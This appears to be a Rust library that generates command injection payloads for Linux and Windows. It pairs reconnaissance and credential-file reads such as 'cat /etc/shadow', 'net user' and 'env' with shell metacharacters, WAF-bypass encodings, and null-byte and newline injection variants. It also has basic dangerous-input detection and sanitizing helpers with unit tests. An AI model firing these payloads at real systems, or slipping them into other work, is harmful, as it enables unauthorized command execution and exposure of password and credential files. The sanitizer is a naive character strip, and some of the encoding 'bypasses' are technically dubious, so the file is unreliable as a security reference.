//! Command Injection Payload Generator
//! Generates bounded command injection payloads for Linux and Windows environments.
//! Uses zero-copy string operations to maintain memory efficiency.

use std::collections::HashMap;

/// Maximum total payloads in the generator (bounded)
const MAX_TOTAL_PAYLOADS: usize = 100;

/// Linux-specific command patterns
const LINUX_PAYLOADS: &[&str] = &[
    "id",
    "whoami",
    "uname -a",
    "pwd",
    "ls -la",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "hostname",
    "ps aux",
    "netstat -an",
    "ifconfig",
    "ip addr",
    "cat /proc/version",
    "cat /etc/issue",
    "w",
    "last",
    "history",
    "env",
    "printenv",
];

/// Windows-specific command patterns
const WINDOWS_PAYLOADS: &[&str] = &[
    "whoami",
    "whoami /all",
    "systeminfo",
    "hostname",
    "tasklist",
    "net user",
    "net localgroup administrators",
    "ipconfig /all",
    "netstat -an",
    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
    "type C:\\boot.ini",
    "dir C:\\",
    "ver",
    "set",
    "echo %USERNAME%",
    "qwinsta",
];

/// Shell metacharacters for bypass techniques
const METACHARACTERS: &[&str] = &[
    ";", "|", "&", "&&", "||", "`", "$(", "${", "<", ">", "\n", "\r",
];

/// Encoding variants for WAF bypass
const ENCODING_VARIANTS: &[fn(&str) -> String] = &[
    |s| s.to_string(), // Plain
    |s| format!("${{{}}}", s), // Bash variable expansion
    |s| format!("$( {})", s), // Command substitution
    |s| format!("`{}`", s), // Backtick
];

pub struct PayloadGenerator {
    linux_payloads: Vec<String>,
    windows_payloads: Vec<String>,
    combined_payloads: Vec<String>,
}

impl PayloadGenerator {
    pub fn new() -> Self {
        let mut linux = Vec::with_capacity(LINUX_PAYLOADS.len());
        let mut windows = Vec::with_capacity(WINDOWS_PAYLOADS.len());
        let mut combined = Vec::with_capacity(MAX_TOTAL_PAYLOADS);
        
        // Generate Linux payloads with various prefixes/suffixes
        for cmd in LINUX_PAYLOADS.iter() {
            linux.push(cmd.to_string());
            
            for meta in METACHARACTERS.iter().take(5) {
                linux.push(format!("{}{}", meta, cmd));
                if combined.len() < MAX_TOTAL_PAYLOADS / 3 {
                    combined.push(format!("{}{}", meta, cmd));
                }
            }
        }
        
        // Generate Windows payloads
        for cmd in WINDOWS_PAYLOADS.iter() {
            windows.push(cmd.to_string());
            
            for meta in METACHARACTERS.iter().take(3) {
                windows.push(format!("{}{}", meta, cmd));
                if combined.len() < MAX_TOTAL_PAYLOADS / 3 {
                    combined.push(format!("{}{}", meta, cmd));
                }
            }
        }
        
        // Add encoding variants
        for cmd in ["id", "whoami", "pwd"].iter() {
            for encoder in ENCODING_VARIANTS.iter() {
                let encoded = encoder(cmd);
                if combined.len() < MAX_TOTAL_PAYLOADS {
                    combined.push(encoded);
                }
            }
        }
        
        // Add null byte injection variants
        for cmd in ["id", "whoami"].iter() {
            combined.push(format!("{}\x00ignored", cmd));
        }
        
        // Add newline injection variants
        for cmd in ["id", "whoami"].iter() {
            combined.push(format!("{}\nignored", cmd));
        }
        
        Self {
            linux_payloads: linux,
            windows_payloads: windows,
            combined_payloads: combined,
        }
    }
    
    /// Get Linux-specific payloads
    pub fn linux(&self) -> &[String] {
        &self.linux_payloads
    }
    
    /// Get Windows-specific payloads
    pub fn windows(&self) -> &[String] {
        &self.windows_payloads
    }
    
    /// Get all combined payloads
    pub fn all(&self) -> &[String] {
        &self.combined_payloads
    }
    
    /// Get payloads optimized for specific context
    pub fn for_context(&self, context: &str) -> &[String] {
        match context.to_lowercase().as_str() {
            "linux" | "unix" => self.linux(),
            "windows" | "win" => self.windows(),
            _ => self.all(),
        }
    }
    
    /// Generate a payload with custom prefix
    pub fn with_prefix(&self, base_cmd: &str, prefix: &str) -> String {
        format!("{}{}", prefix, base_cmd)
    }
    
    /// Check if a payload contains dangerous characters
    pub fn is_dangerous(&self, input: &str) -> bool {
        METACHARACTERS.iter().any(|m| input.contains(m))
    }
    
    /// Sanitize input by removing dangerous characters
    pub fn sanitize(&self, input: &str) -> String {
        let mut result = String::with_capacity(input.len());
        for c in input.chars() {
            if !METACHARACTERS.iter().any(|m| m.contains(c)) {
                result.push(c);
            }
        }
        result
    }
}

impl Default for PayloadGenerator {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_payload_bounds() {
        let gen = PayloadGenerator::new();
        assert!(gen.linux_payloads.len() <= LINUX_PAYLOADS.len() * 6);
        assert!(gen.windows_payloads.len() <= WINDOWS_PAYLOADS.len() * 4);
        assert!(gen.combined_payloads.len() <= MAX_TOTAL_PAYLOADS);
    }
    
    #[test]
    fn test_dangerous_detection() {
        let gen = PayloadGenerator::new();
        assert!(gen.is_dangerous(";id"));
        assert!(gen.is_dangerous("|whoami"));
        assert!(!gen.is_dangerous("safe_input"));
    }
    
    #[test]
    fn test_sanitization() {
        let gen = PayloadGenerator::new();
        let sanitized = gen.sanitize(";id|whoami");
        assert_eq!(sanitized, "idwhoami");
    }
    
    #[test]
    fn test_context_selection() {
        let gen = PayloadGenerator::new();
        assert!(!gen.for_context("linux").is_empty());
        assert!(!gen.for_context("windows").is_empty());
        assert!(!gen.for_context("unknown").is_empty());
    }
}
